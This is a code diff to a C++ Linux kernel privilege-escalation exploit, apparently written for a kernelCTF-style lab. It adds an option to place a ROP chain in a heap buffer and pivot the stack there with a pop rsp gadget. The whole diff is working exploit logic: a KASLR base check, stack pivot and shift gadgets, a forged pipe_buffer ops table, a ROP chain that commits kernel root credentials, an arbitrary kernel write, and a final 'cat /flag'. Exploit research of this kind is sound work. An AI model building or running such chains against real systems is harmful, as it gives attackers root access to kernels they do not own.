@@ -9,6 +9,7 @@
 #include <util/pwn_utils.cpp>
 #include <util/Payload.cpp>
 #include <util/HexDump.cpp>
+#include <util/ArgumentParser.cpp>
 #include <pivot/PivotFinder.cpp>
 
 INCBIN(target_db, "target_db.kpwn");
@@ -47,6 +48,11 @@ uint64_t alloc_victim_pipe(pipefds pipefds) {
     return pipe_addr;
 }
 
+uint64_t alloc_heap_buf(uint64_t size) {
+    Kpwn kpwn;
+    return kpwn.AllocBuffer(size, true);
+}
+
 std::vector<uint8_t> trigger_vuln_arb_read(uint64_t addr, uint64_t size) {
     Kpwn kpwn;
     return kpwn.Read(addr, size);
@@ -57,7 +63,9 @@ void trigger_vuln_arb_write(uint64_t addr, const std::vector<uint8_t>& data) {
     kpwn.Write(addr, data);
 }
 
-int main() {
+int main(int argc, const char** argv) {
+    bool use_heap_buffer = ArgumentParser(argc, argv).hasOption("use-heap-buffer");
+
     KpwnParser kpwn_db(target_db, target_db_size);
     auto target = kpwn_db.AutoDetectTarget();
     printf("[+] Running on target: %s %s\n", target.distro.c_str(), target.release_name.c_str());
@@ -75,6 +83,18 @@ int main() {
     printf("[+] KASLR base = 0x%lx\n", kaslr_base);
     check_kaslr_base(kaslr_base);
 
+    uint64_t heap_addr = 0;
+    if (use_heap_buffer) {
+        heap_addr = alloc_heap_buf(128);
+        printf("[+] Heap addr = 0x%lx\n", heap_addr);
+    }
+
+    printf("[+] ROP chain:\n");
+    RopChain rop(kaslr_base);
+    target.AddRopAction(rop, RopActionId::COMMIT_KERNEL_CREDS);
+    target.AddRopAction(rop, RopActionId::TELEFORK, {1000});
+    HexDump::Print(rop.GetData());
+
     printf("[+] Preparing fake pipe_buffer and ops\n");
     Payload payload(256);
 
@@ -84,7 +104,7 @@ int main() {
     auto release_ptr = (uint64_t*)payload.Reserve(fake_ops_offs + release_offs, 8);
 
     PivotFinder pivot_finder(target.pivots, Register::RSI, payload);
-    auto stack_pivot = pivot_finder.Find();
+    auto stack_pivot = pivot_finder.Find(use_heap_buffer ? 8 : 0);
     if (!stack_pivot.has_value())
         throw ExpKitError("could not find a stack pivot");
 
@@ -92,26 +112,34 @@ int main() {
     stack_pivot->ApplyToPayload(payload, kaslr_base);
     *release_ptr = kaslr_base + stack_pivot->GetGadgetOffset();
 
-    // Find a shift gadget that shifts stack at least by 0x30
-    auto shift_gadget = pivot_finder.FindShift(0x30, 0x48);
-    if (!shift_gadget.has_value())
-        throw ExpKitError("could not find a shift gadget");
-    // TODO: make interface more similar, e.g. use GetGadgetOffset()
-    payload.Set(stack_pivot->GetDestinationOffset(), kaslr_base + shift_gadget->address);
+    if (use_heap_buffer) {
+        // puts ROP chain into a separate heap buffer and pivots RSP there
+        auto pop_rsp = pivot_finder.GetPopRsp();
+        if (!pop_rsp.has_value())
+            throw ExpKitError("could not find a pop rsp gadget");
 
-    RopChain rop(kaslr_base);
-    target.AddRopAction(rop, RopActionId::COMMIT_KERNEL_CREDS);
-    target.AddRopAction(rop, RopActionId::TELEFORK, {1000});
+        payload.Set(stack_pivot->GetDestinationOffset(), kaslr_base + pop_rsp->address);
+        payload.Set(stack_pivot->GetDestinationOffset() + 8, heap_addr);
 
-    // TODO: shifting is weird with this +8 for the current pointer
-    auto rop_idx = stack_pivot->GetDestinationOffset() + 8 + shift_gadget->ret_offset;
-    payload.Set(rop_idx, rop.GetData());
+        printf("[+] Writing ROP chain into heap address\n");
+        trigger_vuln_arb_write(heap_addr, rop.GetData());
+    } else {
+        // Find a shift gadget that shifts stack at least by 0x30
+        auto shift_gadget = pivot_finder.FindShift(0x30, 0x48);
+        if (!shift_gadget.has_value())
+            throw ExpKitError("could not find a shift gadget");
+        // TODO: make interface more similar, e.g. use GetGadgetOffset()
+        payload.Set(stack_pivot->GetDestinationOffset(), kaslr_base + shift_gadget->address);
+        // TODO: shifting is weird with this +8 for the current pointer
+        auto rop_idx = stack_pivot->GetDestinationOffset() + 8 + shift_gadget->ret_offset;
+        payload.Set(rop_idx, rop.GetData());
+    }
 
     printf("[+] Payload:\n");
-    HexDump::Print(payload.GetData());
+    HexDump::Print(payload.GetUsedData());
 
     printf("[+] Triggering ARB write\n");
-    trigger_vuln_arb_write(victim_pipe_addr, payload.GetData());
+    trigger_vuln_arb_write(victim_pipe_addr, payload.GetUsedData());
 
     printf("[+] Testing access as non-root user:\n");
     system("id; cat /flag");
